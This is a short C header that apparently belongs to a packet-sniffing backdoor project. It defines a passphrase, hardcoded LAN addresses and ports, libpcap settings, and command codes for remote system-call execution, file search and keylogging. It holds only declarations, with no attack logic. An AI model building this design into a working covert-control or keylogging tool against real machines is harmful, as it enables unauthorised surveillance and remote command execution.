#ifndef SHARED_LIBRARY_H
#define SHARED_LIBRARY_H

#include <arpa/inet.h>
#include <limits.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <netinet/udp.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define SIZE_ETHERNET 14
#define CONNECTION_PORT 12000
#define PASSPHRASE "&|\\!"
#define SOURCE_IP "192.168.0.186"
#define DEST_IP "192.168.0.180"
#define SOURCE_PORT_STRING "8989"
#define SOURCE_PORT_INT 8989
#define FILTER_BUFFER 1024
#define SNAP_LEN 1518

// Debug flag
#define DEBUG 1

// Command options
#define EXECUTE_SYSTEM_CALL 0
#define FIND_FILE 1
#define KEYLOGGER 2

void systemFatal(const char *message);
char *encrypt_data(char *input, char *key, int inputLength);
unsigned short csum(unsigned short *buf, int len);

#endif
